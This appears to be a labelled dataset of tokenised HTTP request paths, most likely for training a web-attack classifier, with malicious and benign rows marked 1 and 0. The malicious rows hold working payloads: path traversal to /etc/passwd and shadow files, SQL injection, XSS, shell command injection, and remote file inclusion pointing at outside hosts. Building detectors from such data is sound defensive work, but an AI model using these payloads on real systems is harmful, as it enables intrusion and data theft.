request	label
/  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
"/ string / strings / parameters = '  . print (  ` echo hblpla echo  $  (  ( 39 + 88 )  )  echo hblpla echo hblpla `  )  ;  .  "" hblpla "	1
"/ main . php ? logout =  "" rm \ x09q86373985 & rem \ x09 "	1
/ donald fagan / 	0
/ javascript / design . db 	0
/ 187705 / 	0
/ string / strings / parameters = heldo 	0
/ javascript / www-sql . rtf 	0
/ string / strings / parameters = malory7 	0
/ string / strings / parameters = '  |   [  3 -ne  $  ( echo uumiwo  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  & 	1
/ string / strings / parameters = 29967631b 	0
"/ yef5f3d5 . exe ?  < script > document . cookie =  "" testcrcv = 6167 ;  ""  <  / script > "	1
/ sidebarytlogo / 	0
/ 168595 / 	0
/ 436167 / 	0
/ market_nml / 	0
/ b000hezeyg / 	0
/ string / strings / parameters = 12489 	0
/ pbriefs / 	0
/ bzuf9ozq . nsf ?  < script > cross_site_scripting . nasl <  / script > 	1
/ string / strings / parameters = a55r4e1a 	0
/ en-us / h5sc3gxy . fts ?  < script > cross_site_scripting . nasl <  / script > 	1
/ preview . php ? php_script_path = http :  /  / 192 . 168 . 202 . 118 : 8080 / zz5thkvtmlgl ?  ?  & cmd = dir 	1
/ string / strings / parameters = -6600 '  )  union all select 5566 , 5566 # 	1
/ javascript / procurement . ep 	0
/ string / modo = insertar & precio = 1526 & b1 = pasar + por + caja 	0
/ javascript / cgi-pub . 7z 	0
/ klingeltonpacket / 	0
/ wp_intro / 	0
/ galco-dmc22 / 	0
/ string / strings / parameters = 62a $ 5zo 	0
/ 160974 / 	0
/ cgi-bin / index . php ? id = 823dwrvmfh ' 	1
/ javascript / usr . rss 	0
/ string / strings / parameters = 28850 	0
/ string / modo = registro & login = diahann & password = marcel_ino & nombre = asad & apellidos = tonato + valle & email = grizzard @ ytv . com . mv & dni = 75976186x & direccion = c /  + juan + de + lara + 115 ,  + 9 ? a & ciudad = mazcuerras & cp = 43393 & provinciaa = valencia & ntc = 8430846550683709 & b1 = registrar 	1
/  $ sys $ momomomochin-20 / 	0
/ zboot_2 / 	0
/ examples / servlets / servlet / usrdetails . php ? sgnuptype = csaleid < script > nessus <  / script > 	1
/ string / strings / parameters = 1 '  )  )  )  and 6510 =  ( select count (  *  )  from sysusers as sys1 , sysusers as sys2 , sysusers as sys3 , sysusers as sys4 , sysusers as sys5 , sysusers as sys6 , sysusers as sys7 )  and  (  (  (  ' gmvk '  like  ' gmvk 	1
/ string / strings / parameters = < input value =  <  >  < iframe / src = javascript : confirm ( 1 ) 	1
"/ iajtej82 . pl ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ au786-guitar / 	0
/ string / strings / parameters = walker 	0
/ 2185823650037176537itpftf_th / 	0
"/ gy23xnjq . php3 ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
"/ zv8tv7h8 . dll ?  < meta http-equiv = set-cookie content =  "" testcqwz = 9752 ""  > "	1
/ string / strings / parameters = revillarruz 	0
/ en-us / account / search . php ? searchstring =  < script > foo <  / script > 	1
/ javascript / iisadmpwd . vb 	0
/ tom_pinch / 	0
"/  ?  < script > document . cookie =  "" testbfpq = 3326 ;  ""  <  / script > "	1
/ string / strings / parameters = 1 )  as qjbd where 2808 = 2808  ( select  ( case when  ( 5451 = 5451 )  then regexp_substring ( repeat ( right ( char ( 5451 )  , 0 )  , 500000000 )  , null )  else char ( 108 )  |  | char ( 76 )  |  | char ( 112 )  |  | char ( 116 )  end )  from information_schema . system_users )  -- 	1
/ free donwload manager 1 / 	0
/ string / modo = registro & login = mcwalter & password = narbo_nesa & nombre = quiyen & apellidos = mendracaveitia + torreyas & email = tati @ callalabocaatiaherminia . travel & dni = 09352334m & direccion = calle + casarrubuelos ,  + 125 ,  + 10 ? b & ciudad = peaflor & cp = 13270 & provincia = zaragoza & ntc = 6446364885360152 & b1 = registrar 	0
/ examples / jsp / security / protected / j_security_check . copy 	0
/ consumer_alerts / 	0
/ string / strings / parameters = gilden @ gopersonalfitness . ua 	0
/ examples / jsp / checkbox / cal_event . php ? id = 1 '  union select 1 , 2 ,  ' calendarix_id_sql_injection . nasl '  , 4 , 5 , 6 , 7 , 8 , 9 , 10 , 11 , 12 , 13 -- 	1
"/  < script > document . cookie =  "" testbfpq = 3326 ;  ""  <  / script > "	1
/ phprint . php ? module = vtiger_lang_crm_lfi . nasl & action = 1331908785 & lang_crm =  .  .  /  .  .  / vtigerservice . php \ x00 	1
/ string / strings / parameters = <  !  --  ff 14 +   --  > 	1
/ examples / jsp / sessions / libraries / adodb / server . php ? sql =  ' adodb_sql_sql_injection . nasl 	1
/ string / strings / parameters = -4400 union all select 3983 , 3983 , 3983 , 3983 , 3983 , 3983 , 3983 , 3983 , 3983 , 3983 -- 	1
/ cgi-914 / fileseek2 . cgi ? foot =  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  / etc / passwd & head = 	1
/ fergusonconvict / 	0
/ flash_tutorials / 	0
/ string / strings / parameters = .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \ etc \ shadow	1
/ string / id = 1 & nombre = queso + manchego & precio = 39 & cantidad = 52 & b1 = aadir + al + carrito 	0
/ greentable-casino / 	0
/ rfc1090 / 	0
/ string / strings / parameters = 51795949h 	0
/ zmvq66jy . php3 ?  < script > cross_site_scripting . nasl <  / script > 	1
/ babb_fest / 	0
/ 825327 / 	0
/ string / modo = registro & login = graehme & password = enang . ostar & nombre = arstides & apellidos = mal + zurueta & email = laycock_faulds @ peaf . sd & dni = 61603039t & direccion = faustino + cavadas + 162 + 6-a & ciudad = espejn & cp = 21710 & provincia = cceres & ntc = 6351981280005819 & b1 = registrar 	0
/ help . php ? q = ver ,  > q21492123 & rem , 	1
/ javascript / xslt . html 	0
/ choicepoint_vs / 	0
/ drhcprxk . pl 	0
/ string / modo = registro & login = vetrie & password = 41t1lecti22 & nombre = amush & apellidos = trujillo + fornalino & email = benedict @ deltamarina . ve & dni = 95944263q & direccion = pl .  + santa + cruz ,  + 199 +  & ciudad = armaanzas & cp = 47173 & provincia = segovia & ntc = 6986967316168670 & b1 = registrar 	0
/ javascript / core . bat 	0
/ proxy2006 / 	0
/ javascript / closing . pdf 	0
/ string / strings / parameters = quijano 	0
/ 20050822-2 / 	0
/ string / strings / parameters = gianna 	0
/ 221947 / 	0
/ string / strings / parameters = | echo $ ifsgihyii $  (  ( 20 + 80 )  )  $  ( echo $ ifsgihyii ) gihyii | 	1
/ phpmyadmin / www / delivery / ac . php ? bannerid = -1331904368 + or + 1 = 1 +  --  +  '  ; passthru ( base64_decode (  $ _server [ http_nessus_cleauhzy ]  )  )  ; die ;  /  * 	1
/ string / strings / parameters = 1 '  union all select null , null , null -- 	1
/ forum-ra_professionnel . asp ? n =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 	1
/ 000097619 / 	0
/ string / modo = registro & login = slaby & password = 3a91io & nombre = niseas & apellidos = paiva + romera & emaila = owens @ provider . com . br & dni = 74056042k & direccion = aigua + marina + 91 ,  +  & ciudad = chercos & cp = 40421 & provincia = segovia & ntc = 8044294456559903 & b1 = registrar 	1
/ main / inc / main . php689132913 .  ~ 1 ~ 	0
/ admin / user_user . php ? language = xxpathxx 	1
/ 000099761 / 	0
/ string / strings / parameters = mastroma 	0
"/ string / strings / parameters = 1 ""  ""  where 2989 = 2989 or 8421 =  ( select count (  *  )  from generate_series ( 1 , 5000000 )  )  -- "	1
/ string / strings / parameters = & echo $ ifsyczagj $  (  ( 43 + 61 )  )  $  ( echo $ ifsyczagj ) yczagj /  / 	1
/ customer / product . php ? xcart_dir = xxpathxx 	1
/ javascript / 24 . lst 	0
/ string / strings / parameters = '  ; echo kkgoua $  (  ( 23 + 96 )  )  $  ( echo kkgoua ) kkgoua \  \ 	1
/ examples / jsp / colors / htsearch ? exclude =  `  / etc / passwd ` 	1
/ printpublishing / 	0
/ string / strings / parameters = 1 '  )  )  ; select count (  *  )  from domain . domains as t1 , domain . columns as t2 , domain . tables as t3 and  (  (  ' xiyl '  like  ' xiyl 	1
"/ string / strings / parameters = 1 ""  ""  )  )  )  or 6793 =  ( select 6793 from pg_sleep ( 5 )  )  and  (  (  (  ""  "" azmf ""  ""  =  ""  "" azmf "	1
/ funlove75 / 	0
/ scripts / mundimail / template / simpledefault / admin / _masterlayout . php ? top = http :  /  / 192 . 168 . 202 . 96 : 8080 / ipb5ri ? 	1
/ ultimate-racing / 	0
/ string / strings / parameters = 1538 	0
"/ 7dbjwpw6 . cfm ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ javascript / eric . aspx 	0
/ v_129466 / 	0
/ string / strings / parameters = '  |   [  1 -ne  $  ( echo oyypmx  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  /  / 	1
/ lib / header . php ? doc_root = xxpathxx 	1
/ javascript / licenses . pl 	0
/ string / strings / parameters = '  &  & echo zudzmd $  (  ( 43 + 75 )  )  $  ( echo zudzmd ) zudzmd & 	1
/ entreprise_fr / 	0
/ string / strings / parameters = < iframe id = xss  /   / onload = alert (  / xss /  )  >  <  / iframe > 	1
/ string / strings / parameters = 3156 	0
/ saferpay_ecommerce / 	0
/ string / strings / parameters = forns rigall 	0
/ res_info2 / 	0
/ string / modo = registro & login = tejani & password = arable & nombre = josiana & apellidos = de + anta + colondres & email = agunda-wulff @ onoratoinformatica . aq & dni = 427 ' 8643 '  & direccion = c /  + jose + zamoray ,  + s / n + 4c & ciudad = narros + del + puerto & cp = 23770 & provincia = tarragona & ntc = 2400850921681991 & b1 = registrar 	1
/ string / strings / parameters = 6531431919171426 	0
"/ string / strings / parameters = < a href =  "" invalid : 1 ""  id = x name = y > test <  / a > "	1
/ string / modo = registro & login = morneau & password = m8rrega & nombre = nazareth & apellidos = pico + despuig & email = gallego @ cajucar . sn & dni = 51780892a & direccion = c /  + doctor + temes + fernandez ,  + 35 +  & ciudad = marbella & cp = 40313 & provincia = lleida & ntc = 8788488827685780 & b1 = registrar 	0
/ brookingsorder_process / 	0
/ examples / jsp / colors / nucleus / libs / pluginadmin . php ? globals [ dir_libs ]  =  / etc / passwd \ x00 	1
/ ipmpageheader / 	0
/ string / strings / parameters = rub de bracamonte 	0
/ javascript / high . pl 	0
"/ top . php ? stuff =  ""  & ver & rem , "	1
/ string / strings / parameters = order by 3 -- 	1
/ cacti / search . cgi ?  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \ winnt \ win . ini 	1
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo hmzjiq )   &  &  str1 =  $  {  # str }   &  &   [  1 -eq  $  { str1 }   ]   &  &  sleep 1  | 	1
/ string / strings / parameters = 1 )  )  and 4386 = utl_inaddr . get_host_address ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 4386 = 4386 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  and  (  ( 1260 = 1260 	1
/ string / strings / parameters = saturin-fabre0 @ cienciapolicial . int 	0
/ string / strings / parameters = &  & echo $ ifspenfbq $  (  ( 61 + 76 )  )  $  ( echo $ ifspenfbq ) penfbq \  \ 	1
/ string / strings / parameters = 9068716333740358 	0
/ 1852331364 / 	0
/ airsnort-0 / 	0
"/ string / strings / parameters = 1 ""  ""  )  )  or 7427 = dbms_pipe . receive_message ( chr ( 116 )  |  | chr ( 87 )  |  | chr ( 90 )  |  | chr ( 109 )  , 5 )  -- "	1
/ caesar_cipher / 	0
/ access / login . php ? path_to_root = xxpathxx 	1
/ outpost-download / 	0
"/ bl8sefdm . jspa ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ string / strings / parameters = doriot 	0
/ beta-29 / 	0
/ string / strings / parameters = 1 '  +  ( select oqvo where 7448 = 7448 union all select null , null , null , null , null -- 	1
"/ string / strings / parameters = ""  &  & echo $ ifsqirzpo $  (  ( 66 + 91 )  )  $  ( echo $ ifsqirzpo ) qirzpo "	1
/ 173815 / 	0
/ 046944 / 	0
/ javascript / css . csproj 	0
/ examples / servlets / servlet / index . php ? search =  < script > foo <  / script > 	1
/ string / strings / parameters = winstanley @ waterflyesp . hn 	0
/ string / strings / parameters = 1 )  )  as myxo where 1759 = 1759 union all select null # 	1
/ javascript / test3 . class 	0
/ onderzoeken / 	0
/ string / strings / parameters = '  | echo hkfpkh $  (  ( 65 + 16 )  )  $  ( echo hkfpkh ) hkfpkh | 	1
/ en-us / account / search / search . cgi ? keys =  *  & prc = any & catigory =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc 	1
/ string / strings / parameters = 1 where 6173 = 6173 ; select count (  *  )  from all_users t1 , all_users t2 , all_users t3 , all_users t4 , all_users t5 -- 	1
/ javascript / webchat . vbs 	0
/ passepartout21dvd / 	0
/ trojdloaderkm / 	0
"/ b5xdqgz2 . php3 ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ string / strings / parameters = & echo yszwvh $  (  ( 93 + 51 )  )  $  ( echo yszwvh ) yszwvh 	1
/ aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  { file } 	1
/ avex_icon / 	0
"/ string / strings / parameters = -4694 %  ""  ""  )  )  )  union all select 9178 , 9178 , 9178 , 9178 , 9178 -- "	1
/ p1040041 / 	0
/ vpresidence / 	0
/ fabolous ft mike shorey baby / 	0
/ string / strings / parameters = 95 ! 6a752a 	0
/ spamwarezov1 / 	0
/ cgi-bin / wd7crx47eaml . asp 	0
/ cornellidvps02 / 	0
/ string / id = 1 & nombre = queso + manchego & precio = 85 & cantidad = 34 & b1 = aadir + al + carrito 	0
"/ string / strings / parameters = < img id = xss src =  ""  "" livescript :  [ code ]  ""  ""  > "	1
/ offset-mortgages / 	0
/ business-templates / 	0
/ string / strings / parameters = -6045 or 8919 = 2827 -- 	1
/ string / strings / parameters = atmetll farrer 	0
/ 1390395316_s / 	0
/ cybcitpr / 	0
"/ string / strings / parameters = < img \ x47src = x onerror =  "" javascript : alert ( 1 )  ""  > "	1
/ b_imagegrey2 / 	0
/ tv_violence / 	0
/ 171987 / 	0
/ string / strings / parameters = luceni 	0
/ javascript / evil . exe 	1
/ string / strings / parameters = <  / feimage > 	1
/ 127935 / 	0
/ string / strings / parameters = gandolfo 	0
/ news-publishing / 	0
/ string / strings / parameters = lidia 	0
/ string / id = 1 & nombre = jamn + ibrico & precio = 39 & cantidad = 12 & b1 = aadir + al + carrito 	0
/ javascript / mp3 . ep 	0
/ javascript / recorded . csproj 	0
/ javascript / nethome . core 	0
/ cgi / fileseek . cgi ? foot =  ; cat  / etc / passwd & head = 	1
"/ 33y9gcqq . fts ?  < script > document . cookie =  "" testnvxc = 4301 ;  ""  <  / script > "	1
/ string / strings / parameters = dirosario @ errebebe . as 	0
/ zope 3 / 	0
/ u_085b / 	0
/ string / strings / parameters = -5124 '  +  ( select  ' xpww '  where 1752 = 1752 union all select 1752 , 1752 , 1752 , 1752 , 1752 , 1752 , 1752 , 1752 , 1752 , 1752 -- 	1
/ string / strings / parameters = 506ca 	0
/  script > alert document . secin . password . value   / script > 	1
/ clienttop / 	0
/ fid9e838fcfbdd1b66df5bd01c21e774ea7c2f23136 / 	0
/ string / strings / parameters = amelio 	0
/ string / strings / parameters = marylin 	0
/ string / strings / parameters = hiscoe 	0
/ javascript / w . exe 	1
/ string / id = 3 & nombre = queso + manchego & precio = 39 & cantidad = 67 & b1 = aadir + al + carrito 	0
/ string / modo = registro & login = fisico & password = aguzadera & nombre = judas & apellidos = belonne + santaella & email = sinatra @ cementoscalibra . mil & dni = 39960501w & direccion = callejon + huertas + 94 + 7a & ciudad = barakaldo & cp = 49180 & provincia = navarra & ntc = 1281450288895094 & b1 = registrar 	0
"/  ?  < script > document . cookie =  "" testiabz = 5220 ;  ""  <  / script > "	1
/ string / strings / parameters = -8758 '  union all select 6885 , 6885 , 6885 , 6885 , 6885 , 6885 , 6885 , 6885 -- 	1
/ ixsfunc / 	0
/ cgi-bin / index . php ? op = default & date = 200607 '  union select 1 , 199642765 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 --  & blogid = 1 	1
/ string / strings / parameters = a7p9i9bl2 	0
/ rbec2ohx . nsf ?  < script > cross_site_scripting . nasl <  / script > 	1
/ spongebobnn / 	0
/ string / strings / parameters = atufamiento 	0
/ subicon_balance / 	0
/ ciamos_path / modules / forum / include / config . php ? module_cache_path =  ' http :  /  / 192 . 168 . 202 . 96 : 8080 / txenjrxf3 ?  ' 	1
/ string / strings / parameters = 02703849s 	0
/ string / strings / parameters = don quijote 8 	0
/ 253176 / 	0
/ bol_express / 	0
/ shower_tanning / 	0
/ string / strings / parameters = 29142280s 	0
"/ i7prbs22 . html ?  < meta http-equiv = set-cookie content =  "" testjnre = 7328 ""  > "	1
/ string / strings / parameters = '  )  )  )  )  )  )  waitfor delay  ' 0 : 0 : 20 '   /  * 	1
/ string / strings / parameters = 80029600l 	0
/ lsoix5h3 . html ?  < script > cross_site_scripting . nasl <  / script > 	1
"/ string / strings / parameters = ""  &  sleep 0  &  &  str =  $  ( echo rybkip )   &  &  str1 =  $  {  # str }   &  &   [  8 -eq  $  { str1 }   ]   &  &  sleep 1  /  / "	1
/ string / modo = registro & login = august & password = pr3caz & nombre = renny & apellidos = arrechea + bellveh & email = striebeck . magnuson @ alpesfranceses . com . im & dni = 54200725y & direccion = calle + tajo ,  + 182 ,  +  & ciudad = viso + de + san + juan ,  + el & cp = 04858 & provincia = navarra & ntc = 8400392219443841 & b1 = registrar 	0
"/ string / strings / parameters = '  |   [  8 -ne  $  ( echo ldsbta  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  "" "	1
/ javascript / beans . sh 	0
/ scripts / parse_xml . cgi ? action = login & filename = frameset . html | id \ x00 | 	1
/ string / strings / parameters = -9808 '  in boolean mode )  union all select 2528 , 2528 , 2528 , 2528 , 2528 , 2528 , 2528 -- 	1
/ rel_30 / 	0
/ faexecsumm / 	0
/ string / strings / parameters = 8715 	0
/ string / modo = registro & login = daryle & password = tet / r3mero & nombre = licina & apellidos = acexas + camarillo & email = vadis @ clubdegolf . com . gf & dni = 13138842t & direccion = c /  + alberto + casaal + shakery + 60 ,  + 4-h & ciudad = santiurde + de + reinosa & cp = 09471 & provincia = vila & ntc = 3535089372971785 & b1 = registrar 	1
